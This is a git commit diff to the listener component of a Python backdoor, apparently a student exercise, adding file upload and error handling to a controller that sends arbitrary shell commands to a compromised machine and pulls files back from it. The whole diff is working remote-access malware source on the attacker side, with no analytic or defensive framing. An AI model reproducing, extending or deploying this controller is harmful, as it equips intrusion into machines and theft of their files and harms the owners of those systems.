1f7b2f52e6e3d91cf2a889119cda2b4b5768703f
Drilon Krasniqi <drilon.krasniqi@edu.tbz.ch>
2020-07-04 19:25:35 +0200

    Upload and command failure prevention added

--- backdoor/listener.py
+++ backdoor/listener.py
@@ -4,6 +4,7 @@ import socket
 import json
 import base64
 
+
 class Listener:
     def __init__(self, ip, port):  # initialise the function
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create socket
@@ -18,7 +19,7 @@ class Listener:
         json_data = json.dumps(data)
         self.connection.send(json_data)
 
-    def reliable_receive(self):     # unwrap received json object
+    def reliable_receive(self):  # unwrap received json object
         json_data = ""
         while True:
             try:
@@ -30,7 +31,7 @@ class Listener:
     def execute_remotely(self, command):
         self.reliable_send(command)
 
-        if command[0] == "exit":    # Close connect on backdoor
+        if command[0] == "exit":  # Close connect on backdoor
             self.connection.close()
             exit()
 
@@ -41,13 +42,26 @@ class Listener:
             file.write(base64.b64decode(content))
             return "[+] Download successful."
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         while True:
             command = raw_input(">> ")  # python 3 is input instead of raw_input
             command = command.split(" ")
-            result = self.execute_remotely(command)  # Grab content the command gives back
-            if command[0] == "download":
-                result = self.write_file(command[1], result)  # download the file
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remotely(command)  # Grab content the command gives back
+
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)  # download the file
+            except Exception:
+                result = "[-] Error. Try again."
+
             print(result)
 
 
